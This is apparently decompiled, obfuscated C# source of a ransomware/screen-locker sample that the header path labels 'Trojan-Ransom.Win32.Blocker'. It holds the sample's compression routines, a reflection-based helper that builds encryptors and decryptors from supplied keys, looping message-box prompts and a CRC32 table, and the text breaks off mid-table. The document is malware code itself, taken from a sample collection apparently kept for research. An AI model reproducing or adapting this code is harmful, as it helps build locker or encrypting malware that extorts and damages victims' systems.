// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Eddy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC01D82B-BD54-4072-A93C-5F15B05E7DF9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.akyc-1def89a6207936f248e98b4b488019873d07caad5765062c67bdc1142d61074f.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0004
  {
    static \u0003.\u0003.\u0004 \u0001([In] \u0003.\u0003.\u0005 obj0)
    {
      byte[] numArray = new byte[obj0.\u000E];
      Array.Copy((Array) obj0.\u0002, obj0.\u0008, (Array) numArray, 0, obj0.\u000E);
      return new \u0003.\u0003.\u0004(numArray);
    }

    static void \u0001([In] \u0003.\u0003.\u0007.\u0001 obj0)
    {
      int length = obj0.\u0001.Length;
      int[] numArray = new int[obj0.\u0003];
      int num1 = 0;
      obj0.\u0002 = new short[obj0.\u0001.Length];
      for (int index = 0; index < obj0.\u0003; ++index)
      {
        numArray[index] = num1;
        num1 += obj0.\u0001[index] << 15 - index;
      }
      for (int index = 0; index < obj0.\u0002; ++index)
      {
        int num2 = (int) obj0.\u0001[index];
        if (num2 > 0)
        {
          obj0.\u0002[index] = \u0006.\u0004.\u0001(numArray[num2 - 1]);
          numArray[num2 - 1] += 1 << 16 - num2;
        }
      }
    }

    static object \u0001([In] \u0002.\u0002 obj0)
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) 20756114;
    }

    static int \u0001([In] \u0003.\u0003.\u0003 obj0) => 32768 - obj0.\u0004;

    static ICryptoTransform \u0001(
      bool _param0,
      \u0004.\u0003 _param1,
      byte[] _param2,
      [In] byte[] obj3)
    {
      _param1.\u0001.GetProperty("Key").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) _param2
      });
      _param1.\u0001.GetProperty("IV").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) obj3
      });
      return (ICryptoTransform) _param1.\u0001.GetMethod(_param0 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(_param1.\u0001, new object[0]);
    }

    static void \u0001(\u0003.\u0003.\u000F _param0, [In] int obj1)
    {
      \u0006.\u0004.\u0001(_param0, obj1);
      \u0006.\u0004.\u0001(_param0, obj1 >> 16);
    }

    static bool \u0001(\u0003.\u0003.\u0005 _param0, [In] \u0003.\u0003.\u0002 obj1)
    {
      while (true)
      {
        switch (_param0.\u0007)
        {
          case 0:
            _param0.\u0008 = \u0006.\u0004.\u0001(obj1, 5);
            if (_param0.\u0008 >= 0)
            {
              _param0.\u0008 += 257;
              \u0006.\u0004.\u0001(obj1, 5);
              _param0.\u0007 = 1;
              goto case 1;
            }
            else
              goto label_2;
          case 1:
            _param0.\u000E = \u0006.\u0004.\u0001(obj1, 5);
            if (_param0.\u000E >= 0)
            {
              ++_param0.\u000E;
              \u0006.\u0004.\u0001(obj1, 5);
              _param0.\u0010 = _param0.\u0008 + _param0.\u000E;
              _param0.\u0002 = new byte[_param0.\u0010];
              _param0.\u0007 = 2;
              goto case 2;
            }
            else
              goto label_5;
          case 2:
            _param0.\u000F = \u0006.\u0004.\u0001(obj1, 4);
            if (_param0.\u000F >= 0)
            {
              _param0.\u000F += 4;
              \u0006.\u0004.\u0001(obj1, 4);
              _param0.\u0001 = new byte[19];
              _param0.\u0012 = 0;
              _param0.\u0007 = 3;
              goto case 3;
            }
            else
              goto label_8;
          case 3:
            for (; _param0.\u0012 < _param0.\u000F; ++_param0.\u0012)
            {
              int num = \u0006.\u0004.\u0001(obj1, 3);
              if (num < 0)
                return false;
              \u0006.\u0004.\u0001(obj1, 3);
              _param0.\u0001[\u0003.\u0003.\u0005.\u0003[_param0.\u0012]] = (byte) num;
            }
            _param0.\u0001 = new \u0003.\u0003.\u0004(_param0.\u0001);
            _param0.\u0001 = (byte[]) null;
            _param0.\u0012 = 0;
            _param0.\u0007 = 4;
            goto case 4;
          case 4:
            int num1;
            while (((num1 = \u0006.\u0004.\u0001(_param0.\u0001, obj1)) & -16) == 0)
            {
              _param0.\u0002[_param0.\u0012++] = _param0.\u0001 = (byte) num1;
              if (_param0.\u0012 == _param0.\u0010)
                return true;
            }
            if (num1 >= 0)
            {
              if (num1 >= 17)
                _param0.\u0001 = (byte) 0;
              _param0.\u0011 = num1 - 16;
              _param0.\u0007 = 5;
              goto case 5;
            }
            else
              goto label_19;
          case 5:
            int num2 = \u0003.\u0003.\u0005.\u0002[_param0.\u0011];
            int num3 = \u0006.\u0004.\u0001(obj1, num2);
            if (num3 >= 0)
            {
              \u0006.\u0004.\u0001(obj1, num2);
              int num4 = num3 + \u0003.\u0003.\u0005.\u0001[_param0.\u0011];
              while (num4-- > 0)
                _param0.\u0002[_param0.\u0012++] = _param0.\u0001;
              if (_param0.\u0012 != _param0.\u0010)
              {
                _param0.\u0007 = 4;
                continue;
              }
              goto label_29;
            }
            else
              goto label_24;
          default:
            continue;
        }
      }
label_2:
      return false;
label_5:
      return false;
label_8:
      return false;
label_19:
      return false;
label_24:
      return false;
label_29:
      return true;
    }

    static int \u0001(\u0003.\u0003.\u0007 _param0, [In] int obj1)
    {
      int num = 0;
      for (; obj1 >= 4; obj1 >>= 1)
        num += 2;
      return num + obj1;
    }

    static void \u0001(\u0003.\u0003.\u0008 _param0, [In] byte[] obj1)
    {
      _param0.\u0002 = obj1;
      _param0.\u0017 = 0;
      _param0.\u0018 = obj1.Length;
    }

    static int \u0001(\u0003.\u0003.\u0006 _param0, [In] byte[] obj1)
    {
      int num1 = 0;
      int length = obj1.Length;
      int num2 = length;
      while (true)
      {
        do
        {
          \u0003.\u0003.\u0008 obj;
          bool flag1;
          bool flag2;
          do
          {
            int num3 = \u0006.\u0004.\u0001(_param0.\u0001, obj1, num1, length);
            num1 += num3;
            _param0.\u0001 += (long) num3;
            length -= num3;
            if (length != 0 && _param0.\u0007 != 30)
            {
              obj = _param0.\u0001;
              flag1 = (_param0.\u0007 & 4) != 0;
              flag2 = (_param0.\u0007 & 8) != 0;
            }
            else
              goto label_12;
          }
          while (\u0006.\u0004.\u0001(flag1, obj, flag2));
          if (_param0.\u0007 == 16)
            return num2 - length;
          if (_param0.\u0007 == 20)
          {
            for (int index = 8 + (-_param0.\u0001.\u0003 & 7); index > 0; index -= 10)
              \u0006.\u0004.\u0001(_param0.\u0001, 2, 10);
            _param0.\u0007 = 16;
          }
        }
        while (_param0.\u0007 != 28);
        \u0006.\u0004.\u0001(_param0.\u0001);
        _param0.\u0007 = 30;
      }
label_12:
      return num2 - length;
    }

    static void \u0001(\u0003.\u0003.\u0003 _param0, int _param1, [In] int obj2)
    {
      if ((_param0.\u0004 += _param1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = _param0.\u0003 - obj2 & (int) short.MaxValue;
      int num = 32768 - _param1;
      if (sourceIndex <= num && _param0.\u0003 < num)
      {
        if (_param1 <= obj2)
        {
          Array.Copy((Array) _param0.\u0001, sourceIndex, (Array) _param0.\u0001, _param0.\u0003, _param1);
          _param0.\u0003 += _param1;
        }
        else
        {
          while (_param1-- > 0)
            _param0.\u0001[_param0.\u0003++] = _param0.\u0001[sourceIndex++];
        }
      }
      else
        \u0006.\u0004.\u0001(_param0, sourceIndex, _param1, obj2);
    }

    static void \u0001([In] \u0001.\u0002 obj0) => obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);

    static bool \u0001([In] \u0003.\u0003.\u0001 obj0)
    {
      int num1 = \u0006.\u0004.\u0001(obj0.\u0001);
      while (num1 >= 258)
      {
        switch (obj0.\u0013)
        {
          case 7:
            int num2;
            while (((num2 = \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
            {
              \u0006.\u0004.\u0001(obj0.\u0001, num2);
              if (--num1 < 258)
                return true;
            }
            if (num2 < 257)
            {
              if (num2 < 0)
                return false;
              obj0.\u0002 = (\u0003.\u0003.\u0004) null;
              obj0.\u0001 = (\u0003.\u0003.\u0004) null;
              obj0.\u0013 = 2;
              return true;
            }
            obj0.\u0015 = \u0003.\u0003.\u0001.\u0001[num2 - 257];
            obj0.\u0014 = \u0003.\u0003.\u0001.\u0002[num2 - 257];
            goto case 8;
          case 8:
            if (obj0.\u0014 > 0)
            {
              obj0.\u0013 = 8;
              int num3 = \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0014);
              if (num3 < 0)
                return false;
              \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0014);
              obj0.\u0015 += num3;
            }
            obj0.\u0013 = 9;
            goto case 9;
          case 9:
            int index = \u0006.\u0004.\u0001(obj0.\u0002, obj0.\u0001);
            if (index < 0)
              return false;
            obj0.\u0016 = \u0003.\u0003.\u0001.\u0003[index];
            obj0.\u0014 = \u0003.\u0003.\u0001.\u0004[index];
            goto case 10;
          case 10:
            if (obj0.\u0014 > 0)
            {
              obj0.\u0013 = 10;
              int num4 = \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0014);
              if (num4 < 0)
                return false;
              \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0014);
              obj0.\u0016 += num4;
            }
            \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0015, obj0.\u0016);
            num1 -= obj0.\u0015;
            obj0.\u0013 = 7;
            continue;
          default:
            continue;
        }
      }
      return true;
    }

    static void \u0001(byte[] _param0, [In] \u0003.\u0003.\u0004 obj1)
    {
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      for (int index1 = 0; index1 < _param0.Length; ++index1)
      {
        int index2 = (int) _param0[index1];
        if (index2 > 0)
          ++numArray1[index2];
      }
      int num1 = 0;
      int length = 512;
      for (int index = 1; index <= 15; ++index)
      {
        numArray2[index] = num1;
        num1 += numArray1[index] << 16 - index;
        if (index >= 10)
        {
          int num2 = numArray2[index] & 130944;
          int num3 = num1 & 130944;
          length += num3 - num2 >> 16 - index;
        }
      }
      obj1.\u0001 = new short[length];
      int num4 = 512;
      for (int index3 = 15; index3 >= 10; --index3)
      {
        int num5 = num1 & 130944;
        num1 -= numArray1[index3] << 16 - index3;
        for (int index4 = num1 & 130944; index4 < num5; index4 += 128)
        {
          obj1.\u0001[(int) \u0006.\u0004.\u0001(index4)] = (short) (-num4 << 4 | index3);
          num4 += 1 << index3 - 9;
        }
      }
      for (int index5 = 0; index5 < _param0.Length; ++index5)
      {
        int index6 = (int) _param0[index5];
        if (index6 != 0)
        {
          int num6 = numArray2[index6];
          int index7 = (int) \u0006.\u0004.\u0001(num6);
          if (index6 <= 9)
          {
            do
            {
              obj1.\u0001[index7] = (short) (index5 << 4 | index6);
              index7 += 1 << index6;
            }
            while (index7 < 512);
          }
          else
          {
            int num7 = (int) obj1.\u0001[index7 & 511];
            int num8 = 1 << (num7 & 15);
            int num9 = -(num7 >> 4);
            do
            {
              obj1.\u0001[num9 | index7 >> 9] = (short) (index5 << 4 | index6);
              index7 += 1 << index6;
            }
            while (index7 < num8);
          }
          numArray2[index6] = num6 + (1 << 16 - index6);
        }
      }
    }

    static bool \u0001([In] \u0003.\u0003.\u0001 obj0)
    {
      switch (obj0.\u0013)
      {
        case 2:
          if (obj0.\u0001)
          {
            obj0.\u0013 = 12;
            return false;
          }
          int num1 = \u0006.\u0004.\u0001(obj0.\u0001, 3);
          if (num1 < 0)
            return false;
          \u0006.\u0004.\u0001(obj0.\u0001, 3);
          if ((num1 & 1) != 0)
            obj0.\u0001 = true;
          switch (num1 >> 1)
          {
            case 0:
              \u0006.\u0004.\u0001(obj0.\u0001);
              obj0.\u0013 = 3;
              break;
            case 1:
              obj0.\u0001 = \u0003.\u0003.\u0004.\u0001;
              obj0.\u0002 = \u0003.\u0003.\u0004.\u0002;
              obj0.\u0013 = 7;
              break;
            case 2:
              obj0.\u0001 = new \u0003.\u0003.\u0005();
              obj0.\u0013 = 6;
              break;
          }
          return true;
        case 3:
          if ((obj0.\u0017 = \u0006.\u0004.\u0001(obj0.\u0001, 16)) < 0)
            return false;
          \u0006.\u0004.\u0001(obj0.\u0001, 16);
          obj0.\u0013 = 4;
          goto case 4;
        case 4:
          if (\u0006.\u0004.\u0001(obj0.\u0001, 16) < 0)
            return false;
          \u0006.\u0004.\u0001(obj0.\u0001, 16);
          obj0.\u0013 = 5;
          goto case 5;
        case 5:
          int num2 = \u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0017);
          obj0.\u0017 -= num2;
          if (obj0.\u0017 != 0)
            return !obj0.\u0001.IsNeedingInput;
          obj0.\u0013 = 2;
          return true;
        case 6:
          if (!\u0006.\u0004.\u0001(obj0.\u0001, obj0.\u0001))
            return false;
          obj0.\u0001 = \u0006.\u0004.\u0001(obj0.\u0001);
          obj0.\u0002 = \u0006.\u0004.\u0001(obj0.\u0001);
          obj0.\u0013 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0006.\u0004.\u0001(obj0);
        case 12:
          return false;
        default:
          return false;
      }
    }

    static int \u0001(\u0003.\u0003.\u000E _param0, byte[] _param1, int _param2, [In] int obj3)
    {
      if (_param0.\u0003 >= 8)
      {
        _param0.\u0001[_param0.\u0002++] = (byte) _param0.\u0001;
        _param0.\u0001 >>= 8;
        _param0.\u0003 -= 8;
      }
      if (obj3 > _param0.\u0002 - _param0.\u0001)
      {
        obj3 = _param0.\u0002 - _param0.\u0001;
        Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
        _param0.\u0001 = 0;
        _param0.\u0002 = 0;
      }
      else
      {
        Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
        _param0.\u0001 += obj3;
      }
      return obj3;
    }

    static void \u0001(\u0003.\u0003.\u0006 _param0, [In] byte[] obj1) => \u0006.\u0004.\u0001(_param0.\u0001, obj1);

    static void \u0001(
      int _param0,
      byte[] _param1,
      int _param2,
      \u0003.\u0003.\u0007 _param3,
      [In] bool obj4)
    {
      short[] numArray1;
      (numArray1 = _param3.\u0001.\u0001)[256] = (short) ((int) numArray1[256] + 1);
      \u0006.\u0004.\u0001(_param3.\u0001);
      \u0006.\u0004.\u0001(_param3.\u0002);
      \u0006.\u0004.\u0001(_param3.\u0001, _param3.\u0003);
      \u0006.\u0004.\u0001(_param3.\u0002, _param3.\u0003);
      \u0006.\u0004.\u0001(_param3.\u0003);
      int num1 = 4;
      for (int index = 18; index > num1; --index)
      {
        if (_param3.\u0003.\u0001[\u0003.\u0003.\u0007.\u0001[index]] > (byte) 0)
          num1 = index + 1;
      }
      int num2 = 14 + num1 * 3 + \u0006.\u0004.\u0001(_param3.\u0003) + \u0006.\u0004.\u0001(_param3.\u0001) + \u0006.\u0004.\u0001(_param3.\u0002) + _param3.\u000F;
      int num3 = _param3.\u000F;
      for (int index = 0; index < 286; ++index)
        num3 += (int) _param3.\u0001.\u0001[index] * (int) \u0003.\u0003.\u0007.\u0003[index];
      for (int index = 0; index < 30; ++index)
        num3 += (int) _param3.\u0002.\u0001[index] * (int) \u0003.\u0003.\u0007.\u0004[index];
      if (num2 >= num3)
        num2 = num3;
      if (_param0 >= 0 && _param2 + 4 < num2 >> 3)
        \u0006.\u0004.\u0001(_param2, _param1, _param0, _param3, obj4);
      else if (num2 == num3)
      {
        \u0006.\u0004.\u0001(_param3.\u0001, 2 + (obj4 ? 1 : 0), 3);
        \u0003.\u0003.\u0007.\u0001 obj1 = _param3.\u0001;
        short[] numArray2 = \u0003.\u0003.\u0007.\u0002;
        byte[] numArray3 = \u0003.\u0003.\u0007.\u0003;
        \u0006.\u0004.\u0001(numArray2, obj1, numArray3);
        \u0003.\u0003.\u0007.\u0001 obj2 = _param3.\u0002;
        short[] numArray4 = \u0003.\u0003.\u0007.\u0003;
        byte[] numArray5 = \u0003.\u0003.\u0007.\u0004;
        \u0006.\u0004.\u0001(numArray4, obj2, numArray5);
        \u0006.\u0004.\u0001(_param3);
        \u0006.\u0004.\u0001(_param3);
      }
      else
      {
        \u0006.\u0004.\u0001(_param3.\u0001, 4 + (obj4 ? 1 : 0), 3);
        \u0006.\u0004.\u0001(num1, _param3);
        \u0006.\u0004.\u0001(_param3);
        \u0006.\u0004.\u0001(_param3);
      }
    }

    static bool \u0001(int _param0, \u0003.\u0003.\u0007 _param1, [In] int obj2)
    {
      _param1.\u0001[_param1.\u000E] = (short) _param0;
      _param1.\u0002[_param1.\u000E++] = (byte) (obj2 - 3);
      int num1 = \u0006.\u0004.\u0001(_param1, obj2 - 3);
      short[] numArray1;
      IntPtr index1;
      (numArray1 = _param1.\u0001.\u0001)[(int) (index1 = (IntPtr) num1)] = (short) ((int) numArray1[index1] + 1);
      if (num1 >= 265 && num1 < 285)
        _param1.\u000F += (num1 - 261) / 4;
      int num2 = \u0006.\u0004.\u0001(_param1, _param0 - 1);
      short[] numArray2;
      IntPtr index2;
      (numArray2 = _param1.\u0002.\u0001)[(int) (index2 = (IntPtr) num2)] = (short) ((int) numArray2[index2] + 1);
      if (num2 >= 4)
        _param1.\u000F += num2 / 2 - 1;
      return _param1.\u000E >= 16384;
    }

    static int \u0001(byte[] _param0, int _param1, \u0003.\u0003.\u0001 _param2, [In] int obj3)
    {
      int num1 = 0;
      do
      {
        if (_param2.\u0013 != 11)
        {
          int num2 = \u0006.\u0004.\u0001(obj3, _param1, _param0, _param2.\u0001);
          _param1 += num2;
          num1 += num2;
          obj3 -= num2;
          if (obj3 == 0)
            return num1;
        }
      }
      while (\u0006.\u0004.\u0001(_param2) || _param2.\u0001.\u0004 > 0 && _param2.\u0013 != 11);
      return num1;
    }

    static bool \u0001([In] \u0003.\u0003.\u0007 obj0) => obj0.\u000E >= 16384;

    static void \u0001(int _param0, [In] \u0003.\u0003.\u000E obj1)
    {
      obj1.\u0001[obj1.\u0002++] = (byte) _param0;
      obj1.\u0001[obj1.\u0002++] = (byte) (_param0 >> 8);
    }

    static int \u0001([In] \u0003.\u0003.\u0003 obj0) => obj0.\u0004;

    static void \u0001([In] \u0003.\u0003.\u000E obj0)
    {
      if (obj0.\u0003 > 0)
      {
        obj0.\u0001[obj0.\u0002++] = (byte) obj0.\u0001;
        if (obj0.\u0003 > 8)
          obj0.\u0001[obj0.\u0002++] = (byte) (obj0.\u0001 >> 8);
      }
      obj0.\u0001 = 0U;
      obj0.\u0003 = 0;
    }

    static bool \u0001(int _param0, [In] \u0003.\u0003.\u0008 obj1)
    {
      int num1 = 128;
      int num2 = 128;
      short[] numArray = obj1.\u0002;
      int index1 = obj1.\u0014;
      int index2 = obj1.\u0014 + obj1.\u0012;
      int val1 = Math.Max(obj1.\u0012, 2);
      int num3 = Math.Max(obj1.\u0014 - 32506, 0);
      int num4 = obj1.\u0014 + 258 - 1;
      byte num5 = obj1.\u0001[index2 - 1];
      byte num6 = obj1.\u0001[index2];
      if (val1 >= 8)
        num1 >>= 2;
      if (num2 > obj1.\u0015)
        num2 = obj1.\u0015;
      do
      {
        if ((int) obj1.\u0001[_param0 + val1] == (int) num6 && (int) obj1.\u0001[_param0 + val1 - 1] == (int) num5 && (int) obj1.\u0001[_param0] == (int) obj1.\u0001[index1] && (int) obj1.\u0001[_param0 + 1] == (int) obj1.\u0001[index1 + 1])
        {
          int num7 = _param0 + 2;
          int num8 = index1 + 2;
          int num9;
          int num10;
          int num11;
          int num12;
          int num13;
          int num14;
          int num15;
          do
            ;
          while ((int) obj1.\u0001[++num8] == (int) obj1.\u0001[num9 = num7 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num10 = num9 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num11 = num10 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num12 = num11 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num13 = num12 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num14 = num13 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num15 = num14 + 1] && (int) obj1.\u0001[++num8] == (int) obj1.\u0001[num7 = num15 + 1] && num8 < num4);
          if (num8 > index2)
          {
            obj1.\u0011 = _param0;
            index2 = num8;
            val1 = num8 - obj1.\u0014;
            if (val1 < num2)
            {
              num5 = obj1.\u0001[index2 - 1];
              num6 = obj1.\u0001[index2];
            }
            else
              break;
          }
          index1 = obj1.\u0014;
        }
      }
      while ((_param0 = (int) numArray[_param0 & (int) short.MaxValue] & (int) ushort.MaxValue) > num3 && --num1 != 0);
      obj1.\u0012 = Math.Min(val1, obj1.\u0015);
      return obj1.\u0012 >= 3;
    }

    static void \u0001(\u0003.\u0003.\u000E _param0, int _param1, [In] int obj2)
    {
      _param0.\u0001 |= (uint) (_param1 << _param0.\u0003);
      _param0.\u0003 += obj2;
      if (_param0.\u0003 < 16)
        return;
      _param0.\u0001[_param0.\u0002++] = (byte) _param0.\u0001;
      _param0.\u0001[_param0.\u0002++] = (byte) (_param0.\u0001 >> 8);
      _param0.\u0001 >>= 16;
      _param0.\u0003 -= 16;
    }

    static void \u0001([In] \u0003.\u0003.\u0007 obj0)
    {
      obj0.\u000E = 0;
      obj0.\u000F = 0;
    }

    static int \u0001(\u0003.\u0003.\u0004 _param0, [In] \u0003.\u0003.\u0002 obj1)
    {
      int index1;
      if ((index1 = \u0006.\u0004.\u0001(obj1, 9)) >= 0)
      {
        int num1;
        if ((num1 = (int) _param0.\u0001[index1]) >= 0)
        {
          \u0006.\u0004.\u0001(obj1, num1 & 15);
          return num1 >> 4;
        }
        int num2 = -(num1 >> 4);
        int num3 = num1 & 15;
        int num4;
        if ((num4 = \u0006.\u0004.\u0001(obj1, num3)) >= 0)
        {
          int num5 = (int) _param0.\u0001[num2 | num4 >> 9];
          \u0006.\u0004.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        int num6 = obj1.\u0003;
        int num7 = \u0006.\u0004.\u0001(obj1, num6);
        int num8 = (int) _param0.\u0001[num2 | num7 >> 9];
        if ((num8 & 15) > num6)
          return -1;
        \u0006.\u0004.\u0001(obj1, num8 & 15);
        return num8 >> 4;
      }
      int num9 = obj1.\u0003;
      int index2 = \u0006.\u0004.\u0001(obj1, num9);
      int num10 = (int) _param0.\u0001[index2];
      if (num10 < 0 || (num10 & 15) > num9)
        return -1;
      \u0006.\u0004.\u0001(obj1, num10 & 15);
      return num10 >> 4;
    }

    static void \u0001([In] \u0003.\u0003.\u0007 obj0)
    {
      for (int index = 0; index < obj0.\u000E; ++index)
      {
        int num1 = (int) obj0.\u0002[index] & (int) byte.MaxValue;
        int num2 = (int) obj0.\u0001[index];
        int num3 = num2 - 1;
        if (num2 != 0)
        {
          int num4 = \u0006.\u0004.\u0001(obj0, num1);
          \u0006.\u0004.\u0001(obj0.\u0001, num4);
          int num5 = (num4 - 261) / 4;
          if (num5 > 0 && num5 <= 5)
            \u0006.\u0004.\u0001(obj0.\u0001, num1 & (1 << num5) - 1, num5);
          int num6 = \u0006.\u0004.\u0001(obj0, num3);
          \u0006.\u0004.\u0001(obj0.\u0002, num6);
          int num7 = num6 / 2 - 1;
          if (num7 > 0)
            \u0006.\u0004.\u0001(obj0.\u0001, num3 & (1 << num7) - 1, num7);
        }
        else
          \u0006.\u0004.\u0001(obj0.\u0001, num1);
      }
      \u0006.\u0004.\u0001(obj0.\u0001, 256);
    }

    static object \u0001([In] \u0004.\u0001 obj0)
    {
      int num1 = (int) MessageBox.Show(\u0003.\u0002.\u0001(513));
      try
      {
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        \u0003.\u0002.\u0001(542);
        while (true)
        {
          int num2 = (int) MessageBox.Show(\u0003.\u0002.\u0001(876));
          try
          {
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
          }
          try
          {
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            ProjectData.ClearProjectError();
          }
          \u0003.\u0002.\u0001(1046);
          int num3 = (int) MessageBox.Show(\u0003.\u0002.\u0001(1196));
        }
      }
      return (object) 16297698;
    }

    static void \u0001([In] \u0003.\u0003.\u0008 obj0) => obj0.\u0010 = (int) obj0.\u0001[obj0.\u0014] << 5 ^ (int) obj0.\u0001[obj0.\u0014 + 1];

    static void \u0001(\u0003.\u0003.\u0003 _param0, [In] int obj1)
    {
      if (_param0.\u0004++ == 32768)
        throw new InvalidOperationException();
      _param0.\u0001[_param0.\u0003++] = (byte) obj1;
      _param0.\u0003 &= (int) short.MaxValue;
    }

    static void \u0001(
      int _param0,
      byte[] _param1,
      int _param2,
      \u0003.\u0003.\u0007 _param3,
      [In] bool obj4)
    {
      \u0006.\u0004.\u0001(_param3.\u0001, obj4 ? 1 : 0, 3);
      \u0006.\u0004.\u0001(_param3.\u0001);
      \u0006.\u0004.\u0001(_param0, _param3.\u0001);
      \u0006.\u0004.\u0001(~_param0, _param3.\u0001);
      \u0006.\u0004.\u0001(_param2, _param0, _param3.\u0001, _param1);
      \u0006.\u0004.\u0001(_param3);
    }

    static int \u0001(int _param0, int _param1, byte[] _param2, [In] \u0003.\u0003.\u0003 obj3)
    {
      int num1 = obj3.\u0003;
      if (_param0 > obj3.\u0004)
        _param0 = obj3.\u0004;
      else
        num1 = obj3.\u0003 - obj3.\u0004 + _param0 & (int) short.MaxValue;
      int num2 = _param0;
      int length = _param0 - num1;
      if (length > 0)
      {
        Array.Copy((Array) obj3.\u0001, 32768 - length, (Array) _param2, _param1, length);
        _param1 += length;
        _param0 = num1;
      }
      Array.Copy((Array) obj3.\u0001, num1 - _param0, (Array) _param2, _param1, _param0);
      obj3.\u0004 -= num2;
      if (obj3.\u0004 < 0)
        throw new InvalidOperationException();
      return num2;
    }

    static object \u0001([In] \u0002.\u0003 obj0)
    {
      Decimal num1 = 3M;
      int num2 = (int) MessageBox.Show(\u0003.\u0002.\u0001(1386));
      num1 = 1M;
      \u0003.\u0002.\u0001(1572);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) 890;
    }

    static int \u0001(\u0003.\u0003.\u0007 _param0, [In] int obj1)
    {
      if (obj1 == (int) byte.MaxValue)
        return 285;
      int num = 257;
      for (; obj1 >= 8; obj1 >>= 1)
        num += 4;
      return num + obj1;
    }

    static void \u0001([In] \u0003.\u0003.\u0003 obj0) => obj0.\u0004 = obj0.\u0003 = 0;

    static byte[] \u0001(int _param0, byte[] _param1, byte[] _param2, byte[] _param3)
    {
      try
      {
        \u0003.\u0003.\u000F obj1 = new \u0003.\u0003.\u000F();
        switch (_param0)
        {
          case 0:
            \u0003.\u0003.\u0006 obj2 = new \u0003.\u0003.\u0006();
            DateTime now = DateTime.Now;
            long num1 = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
            uint[] numArray = new uint[256]
            {
              0U,
              1996959894U,
              3993919788U,
              2567524794U,
              124634137U,
              1886057615U,
              3915621685U,
              2657392035U,
              249268274U,
              2044508324U,
              3772115230U,
              2547177864U,
              162941995U,
              2125561021U,
              3887607047U,
              2428444049U,
              498536548U,
              1789927666U,
              4089016648U,
              2227061214U,
              450548861U,
              1843258603U,
              4107580753U,
              2211677639U,
              325883990U,
              1684777152U,
              4251122042U,
              2321926636U,
              335633487U,
              1661365465U,
              4195302755U,
              2366115317U,
              997073096U,
              1281953886U,
              3579855332U,
              2724688242U,
              1006888145U,
              1258607687U,
              3524101629U,
              2768942443U,
              901097722U,
              1119000684U,
              3686517206U,
              2898065728U,
              853044451U,
              1172266101U,
              3705015759U,
              2882616665U,
              651767980U,
              1373503546U,
              3369554304U,
              3218104598U,
              565507253U,
              1454621731U,
              3485111705U,
              3099436303U,
              671266974U,
              1594198024U,
              3322730930U,
              2970347812U,
              795835527U,
              1483230225U,
              3244367275U,
              3060149565U,
              1994146192U,
              31158534U,
              2563907772U,
              4023717930U,
              1907459465U,
              112637215U,
              2680153253U,
              3904427059U,
              2013776290U,
              251722036U,
              2517215374U,
              3775830040U,
              2137656763U,
              141376813U,
              2439277719U,
              3865271297U,
              1802195444U,
              476864866U,
              2238001368U,
              4066508878U,
              1812370925U,
              453092731U,
              2181625025U,
              4111451223U,
              1706088902U,
              314042704U,
              2344532202U,
              4240017532U,
              1658658271U,
              366619977U,
              2362670323U,
              4224994405U,
              1303535960U,
              984961486U,
              2747007092U,
              3569037538U,
              1256170817U,
              1037604311U,
              2765210733U,
              3554079995U,
              1131014506U,
              879679996U,
              2909243462U,
              3663771856U,
              1141124467U,
              855842277U,
              2852801631U,
              3708648649U,
              1342533948U,
              654459306U,
              3188396048U,
              3373015174U,
              1466479909U,
              544179635U,
              3110523913U,
              3462522015U,
              1591671054U,
              702138776U,
              2966460450U,
              3352799412U,
              1504918807U,
              783551873U,
              3082640443U,
              3233442989U,
              3988292384U,
              2596254646U,
              62317068U,
              1957810842U,
              3939845945U,
              2647816111U,
              81470997U,
              1943803523U,
              3814918930U,
              2489596804U,
              225274430U,
              2053790376U,
              3826175755U,
              2466906013U,
              167816743U,
              2097651377U,
              4027552580U,
              2265490386U,
              503444072U,
              1762050814U,
              4150417245U,
              2154129355U,
              426522225U,
              1852507879U,
              4275313526U,
              2312317920U,
              282753626U,
              1742555852U,
              4189708143U,
              2394877945U,
              397917763U,
              1622183637U,
              3604390888U,
              2714866558U,
              953729732U,
              1340076626U,
              3518719985U,
              2797360999U,
              1068828381U,
              1219638859U,
